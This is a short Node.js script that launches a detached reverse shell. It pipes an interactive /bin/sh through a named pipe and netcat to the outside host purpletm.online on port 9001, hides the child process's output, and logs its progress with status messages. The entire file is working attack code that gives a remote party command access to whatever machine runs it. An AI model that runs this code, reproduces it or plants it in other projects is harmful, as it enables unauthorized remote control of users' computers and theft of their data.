const { spawn } = require('child_process');

console.log('🔧 Starting macOS-compatible reverse shell...');
console.log('🎯 Target: purpletm.online:9001');

// macOS netcat doesn't support -e, so we use the mkfifo method
const command = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc purpletm.online 9001 > /tmp/f';

console.log('📡 Using mkfifo method for macOS compatibility...');

const child = spawn('sh', ['-c', command], {
    detached: true,
    stdio: ['ignore', 'ignore', 'ignore']
});

child.on('spawn', () => {
    console.log(`✅ Reverse shell spawned with PID: ${child.pid}`);
    console.log('🔗 Connection should be established to purpletm.online:9001');
    child.unref();
});

child.on('error', (error) => {
    console.error(`❌ Spawn error: ${error.message}`);
});

console.log('🚀 Reverse shell initiated!');